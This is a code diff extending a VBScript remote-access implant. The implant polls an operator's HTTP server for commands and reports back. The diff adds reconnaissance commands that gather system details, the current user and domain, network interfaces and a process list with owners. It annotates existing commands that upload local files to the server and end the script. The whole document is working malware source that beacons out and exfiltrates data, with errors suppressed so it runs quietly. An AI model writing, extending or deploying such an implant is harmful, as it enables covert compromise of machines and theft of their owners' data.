@@ -16,6 +16,7 @@ On Error Resume Next
 ' Instantiate objects
 Dim shell: Set shell = CreateObject("WScript.Shell")
 Dim fs: Set fs = CreateObject("Scripting.FileSystemObject")
+Dim wmi: Set wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\CIMV2")
 Dim http: Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
 If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest")
 If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP")
@@ -32,6 +33,7 @@ intSleep = 5000
 strUrl = "http://" & strHost & ":" & strPort
 
 ' Periodically poll for commands
+Dim strInfo
 While True
     ' Fetch next command
     http.Open "GET", strUrl & "/", False
@@ -54,6 +56,95 @@ While True
         Case "NOOP"
             WScript.Sleep intSleep
         
+        ' Get host info
+        Case "SYSINFO"
+            Dim objOS, strComputer, strOS, strBuild, strServicePack, strArchitecture, strLanguage
+            For Each objOS in wmi.ExecQuery("SELECT * FROM Win32_OperatingSystem")
+               strComputer = objOS.CSName
+               strOS = objOS.Caption
+               strBuild = objOS.BuildNumber
+               strServicePack = objOS.CSDVersion
+               strArchitecture = objOS.OSArchitecture
+               strLanguage = objOS.OSLanguage
+               Exit For
+            Next
+
+            Dim strVersion
+            strVersion = strOS & " (Build " & strBuild
+            If strServicePack <> "" Then
+                strVersion = strVersion & ", " & strServicePack
+            End If
+            strVersion = strVersion & ")"
+            
+            strInfo = "Computer: " & strComputer & vbCrLf & _
+                      "OS: " & strVersion & vbCrLf & _
+                      "Architecture: " & strArchitecture & vbCrLf & _
+                      "System Language: " & strLanguage
+
+            SendStatusUpdate strRawCommand, strInfo
+
+        ' Current user, including domain
+        Case "GETUID"
+            Dim strUserDomain, strUsername
+            strUserDomain = shell.ExpandEnvironmentStrings("%USERDOMAIN%")
+            strUsername = shell.ExpandEnvironmentStrings("%USERNAME%")
+            strInfo = "Username: " & strUserDomain & "\" & strUserName
+            
+            SendStatusUpdate strRawCommand, strInfo
+
+        ' IP configuration
+        Case "IFCONFIG"
+            Dim arrNetworkAdapters: Set arrNetworkAdapters = wmi.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE MACAddress > ''")
+            Dim objAdapter
+            strInfo = ""
+            For Each objAdapter In arrNetworkAdapters
+                strInfo = strInfo & objAdapter.Description & vbCrLf
+                If IsArray(objAdapter.IPAddress) Then
+                    strInfo = strInfo & Join(objAdapter.IPAddress, vbCrLf) & vbCrLf & vbCrLf
+                Else
+                    strInfo = strInfo & "[Interface down]" & vbCrLf & vbCrLf
+                End If
+            Next
+
+            ' Remove trailing \r\n's
+            strInfo = Mid(strInfo, 1, Len(strInfo)-4)
+
+            SendStatusUpdate strRawCommand, strInfo
+
+        ' Process list
+        Case "PS"
+            Dim arrProcesses: Set arrProcesses = wmi.ExecQuery("SELECT * FROM Win32_Process")
+            strInfo = PadRight("PID", 5) & "  " & PadRight("Name", 24) & "  " & "Session" & "  " & PadRight("User", 19) & "  " & "Path" & vbCrLf & _
+                      PadRight("---", 5) & "  " & PadRight("----", 24) & "  " & "-------" & "  " & PadRight("----", 19) & "  " & "----" & vbCrLf
+            Dim objProcess, strPID, strName, strSession, intHresult, strPDomain, strPUsername, strDomainUser, strPath
+            For Each objProcess In arrProcesses
+                strPID = objProcess.Handle
+                strName = objProcess.Name
+                strSession = objProcess.SessionId
+                intHresult = objProcess.GetOwner(strPUsername, strPDomain)
+                Select Case intHresult
+                    Case 0
+                        strDomainUser = strPDomain & "\" & strPUsername
+                    Case 2
+                        strDomainUser = "[Access Denied]"
+                    Case 3
+                        strDomainUser = "[Insufficient Privilege]"
+                    Case 8
+                        strDomainUser = "[Unknown Failure]"
+                    Case Else
+                        strDomainUser = "[Other]"
+                End Select
+                
+                strPath = objProcess.ExecutablePath
+
+                strInfo = strInfo & PadRight(strPid, 5) & "  " & PadRight(strName, 24) & "  " & PadRight(strSession, 7) & "  " & PadRight(strDomainUser, 19) & "  " & strPath & vbCrLf
+            Next
+
+            ' Remove trailing newline
+            strInfo = Mid(strInfo, 1, Len(strInfo)-2)
+
+            SendStatusUpdate strRawCommand, strInfo
+
         ' Set sleep time
         Case "SLEEP"
             If strArgument <> "" Then
@@ -121,6 +212,7 @@ While True
             arrSplitUrl = Array()
             strFilename = Empty
 
+        ' Send a file to the server
         Case "GET"
             ' Only download if file exists
             If fs.FileExists(strArgument) Then
@@ -141,6 +233,7 @@ While True
 
                 ' Clean up
                 binFileContents = Empty
+            ' File does not exist
             Else
                 SendStatusUpdate strRawCommand, "File does not exist: " & strArgument
             End If
@@ -149,10 +242,12 @@ While True
             arrSplitUrl = Array()
             strFilename = Empty
 
+        ' Self-destruction, exits script
         Case "KILL"
             SendStatusUpdate strRawCommand, "Goodbye!"
             WScript.Quit 0
 
+        ' Unknown command
         Case Else
             SendStatusUpdate strRawCommand, "Unknown command"
     End Select
@@ -162,7 +257,16 @@ While True
     arrResponseText = Array()
     strCommand = Empty
     strArgument = Empty
+    strInfo = Empty
 Wend
+
+
+Function PadRight(strInput, intLength)
+    Dim strOutput
+    strOutput = LEFT(strInput & Space(intLength), intLength)
+    strOutput = LEFT(strOutput & String(intLength, " "), intLength)
+    PadRight = strOutput
+End Function
 
 
 Function SendStatusUpdate(strText, strData)
